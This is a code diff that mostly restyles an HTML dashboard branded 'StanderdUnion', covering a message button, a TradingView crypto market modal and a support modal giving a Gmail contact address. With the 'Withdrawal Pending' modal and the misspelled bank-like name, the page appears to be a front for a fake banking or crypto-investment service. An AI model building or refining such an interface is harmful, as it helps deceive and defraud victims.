@@ -6,7 +6,7 @@
     </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>StanderdUnion</title>
+    <title>StanderdUnion - Dashboard</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -48,9 +48,10 @@
                             <span class="action-icon">$</span> Pay
                         </button>
                     </div>
+                    <!-- Premium Message Button -->
                     <div style="padding-top: 4px;">
-                        <button onclick="showMessageModal()" style="background: #fdf5e6; border: none; border-radius: 14px; padding: 10px; width: 100%; font-weight: 800; font-size: 11px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;">
-                            <span class="action-icon" style="font-size: 14px; background: rgba(0,0,0,0.08); width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center;">✉</span> Message
+                        <button onclick="showMessageModal()" style="background: #c5a04a; border: none; border-radius: 16px; padding: 14px 2px; color: #000; font-size: 11px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 10px; cursor: pointer; transition: filter 0.2s; width: 100%;">
+                            <span class="action-icon" style="background: rgba(0,0,0,0.12); width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center;">✉</span> Message
                         </button>
                     </div>
                 </div>
@@ -121,33 +122,15 @@
         </div>
     </div>
 
+    <!-- Live Crypto Market Modal -->
     <div id="cryptoMarketModal" class="modal">
         <div class="modal-content" style="max-width: 360px; width: 90%; height: auto; padding-bottom: 20px;">
             <h3 style="color: #8b6826; margin-bottom: 15px;">Live Cryptocurrency Market</h3>
-            
             <div class="tradingview-widget-container" style="margin-bottom: 15px;">
                 <div class="tradingview-widget-container__widget"></div>
                 <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-market-overview.js" async>
                 {
                 "colorTheme": "light",
-                "dateRange": "12M",
-                "showChart": true,
-                "locale": "en",
-                "largeChartUrl": "",
-                "isTransparent": false,
-                "showSymbolLogo": true,
-                "showFloatingTooltip": false,
-                "width": "100%",
-                "height": "280",
-                "plotLineColorGrowing": "#2962FF",
-                "plotLineColorFalling": "#2962FF",
-                "gridLineColor": "#e9e9ea",
-                "scaleFontColor": "rgba(120, 120, 120, 1)",
-                "belowLineFillColorGrowing": "rgba(41, 98, 255, 0.12)",
-                "belowLineFillColorFalling": "rgba(41, 98, 255, 0.12)",
-                "belowLineFillColorGrowingBottom": "rgba(41, 98, 255, 0)",
-                "belowLineFillColorFallingBottom": "rgba(41, 98, 255, 0)",
-                "symbolActiveColor": "rgba(41, 98, 255, 0.12)",
                 "symbols": [
                   { "s": "BITSTAMP:BTCUSD", "d": "Bitcoin" },
                   { "s": "BITSTAMP:ETHUSD", "d": "Ethereum" },
@@ -156,11 +139,11 @@
                 }
                 </script>
             </div>
-
             <button onclick="closeModals()" style="width: 100%; padding: 12px; margin-top: 10px;">Back to Account</button>
         </div>
     </div>
 
+    <!-- Withdrawal Pending Modal -->
     <div id="withdrawalModal" class="modal">
         <div class="modal-content">
             <h3 style="color: #c62828;">Withdrawal Pending</h3>
@@ -169,15 +152,17 @@
         </div>
     </div>
 
+    <!-- Premium Message/Support Modal -->
     <div id="messageModal" class="modal">
-        <div class="modal-content">
-            <h3>Contact Support</h3>
-            <p>Please reach out to support at:</p>
-            <p style="font-weight: bold; font-size: 16px; color: #8b6826; word-break: break-all;">Cryptofinanceservicess@Gmail.com</p>
-            <button onclick="closeModals()">Close</button>
+        <div class="modal-content" style="background: #111; color: #fff; border: 1px solid #c5a04a; border-radius: 24px; padding: 30px; text-align: center; max-width: 300px; width: 78%; margin: auto; box-shadow: 0 12px 30px rgba(0,0,0,0.6);">
+            <h3 style="color: #c5a04a; margin-top: 0;">Support Center</h3>
+            <p style="color: #ccc; font-size: 14px; margin-bottom: 20px;">For assistance, please contact our support team via email:</p>
+            <p style="font-weight: bold; font-size: 15px; color: #c5a04a; margin: 15px 0;">Cryptofinanceservicess@Gmail.com</p>
+            <button onclick="closeModals()" style="background: #c5a04a; color: #000; border: none; padding: 12px 36px; border-radius: 12px; font-weight: 800; cursor: pointer; margin-top: 10px;">Close</button>
         </div>
     </div>
 
+    <!-- Transaction Receipt Modal -->
     <div id="receiptModal" class="modal">
         <div class="modal-content">
             <h3>Transaction Receipt</h3>
